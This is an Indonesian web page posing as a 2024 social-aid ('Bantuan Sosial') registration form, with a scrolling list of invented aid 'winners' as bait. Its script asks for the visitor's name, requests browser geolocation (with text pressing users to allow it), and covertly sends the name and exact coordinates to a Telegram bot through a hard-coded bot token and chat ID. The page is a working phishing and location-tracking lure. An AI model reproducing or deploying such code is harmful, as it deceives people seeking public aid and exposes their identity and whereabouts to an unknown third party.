<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bantuan Sosial 2024</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #42a5f5, #478ed1, #3d6fb8);
            color: white;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        .container {
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
        }
        form {
            margin-bottom: 30px;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            border-radius: 5px;
            border: none;
            margin-top: 10px;
            font-size: 1.2rem;
            display: block;
            margin: 10px auto;
        }
        input[type="submit"] {
            background-color: #42a5f5;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
            font-size: 1.2rem;
            display: inline-block;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background-color: #478ed1;
        }
        .info {
            margin-top: 20px;
            text-align: left;
            font-size: 1.1rem;
        }
        .info p {
            margin: 10px 0;
        }
        .winners {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            max-height: 200px;
            overflow: hidden;
            position: relative;
        }
        .winner-list {
            list-style: none;
            padding: 0;
            margin: 0;
            animation: scroll 10s linear infinite;
        }
        .winner-list li {
            margin: 10px 0;
            font-size: 1.1rem;
        }
        @keyframes scroll {
            0% { transform: translateY(0); }
            100% { transform: translateY(-100%); }
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Bantuan Sosial 2024</h1>
    <form id="nameForm">
        <label for="nama">Masukkan Nama Anda:</label><br>
        <input type="text" id="nama" name="nama" placeholder="Nama Anda"><br><br>
        <input type="submit" value="Kirim">
    </form>

    <div class="info" id="info">
        <p><strong>üë§ Nama: </strong><span id="userName">Belum diisi</span></p>
        <p><strong>üìç Lokasi: </strong><span id="userLocation">Belum diisi</span></p>
    </div>
        <h2>Pemenang Bantuan Sosial</h2>
    <!-- Bagian Pemenang -->
    <div class="winners">
        <ul class="winner-list" id="winnerList">
            <!-- Pemenang akan dimasukkan secara otomatis -->
        </ul>
    </div>
</div>

<script>
    const form = document.getElementById('nameForm');
    const userNameSpan = document.getElementById('userName');
    const userLocationSpan = document.getElementById('userLocation');
    let userName = '';
    let userLocation = '';

    // Data acak pemenang
    const pemenang = [
        { nama: 'Ade Santoso', 
        alamat: 'Jakarta' },
        { nama: 'Budi Prasetyo', 
        alamat: 'Bandung' },
        { nama: 'Citra Maharani', 
        alamat: 'Surabaya' },
        { nama: 'Dewi Lestari', 
        alamat: 'Yogyakarta' },
        { nama: 'Eko Saputra', 
        alamat: 'Semarang' },
        { nama: 'Fajar Nugraha', 
        alamat: 'Malang' },
        { nama: 'Gina Fitriani', 
        alamat: 'Medan' },
        { nama: 'Hadi Wirawan', 
        alamat: 'Bali' },
        { nama: 'Intan Wulandari', 
        alamat: 'Makassar' },
        { nama: 'Joko Subagio', 
        alamat: 'Palembang' }
    ];

    // Tampilkan daftar pemenang secara acak
    function tampilkanPemenang() {
        const winnerList = document.getElementById('winnerList');
        winnerList.innerHTML = ''; // Kosongkan list sebelumnya
        pemenang.forEach(winner => {
            const li = document.createElement('li');
            li.textContent = `Nama:\n ${winner.nama},Alamat: ${winner.alamat}`;
            winnerList.appendChild(li);
        });
    }

    tampilkanPemenang();

    form.addEventListener('submit', (event) => {
        event.preventDefault();
        userName = document.getElementById('nama').value;
        userNameSpan.textContent = userName;
        getLocation();
    });

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, showError);
        } else {
            userLocationSpan.textContent = "Geolocation tidak didukung oleh browser ini.";
        }
    }

    function showPosition(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        userLocation = `Latitude: ${lat}, Longitude: ${lon}`;
        userLocationSpan.textContent = userLocation;

        // Kirim data ke bot Telegram
        const botToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
        const chatId = '6864784021'; // Ganti dengan ID chat bot Telegram
        const message = `üë§ Nama: ${userName}\nüìç Lokasi: ${userLocation}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Pesan terkirim:', data);
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }

    function showError(error) {
        switch(error.code) {
            case error.PERMISSION_DENIED:
                userLocationSpan.textContent = "Harap izinkan lokasi nya\nsupaya system dapat melihat data nya terlebih dahulu";
                break;
            case error.POSITION_UNAVAILABLE:
                userLocationSpan.textContent = "Informasi lokasi tidak tersedia.";
                break;
            case error.TIMEOUT:
                userLocationSpan.textContent = "Permintaan lokasi timeout.";
                break;
            case error.UNKNOWN_ERROR:
                userLocationSpan.textContent = "Terjadi kesalahan yang tidak diketahui.";
                break;
        }
    }
</script>

</body>
</html>
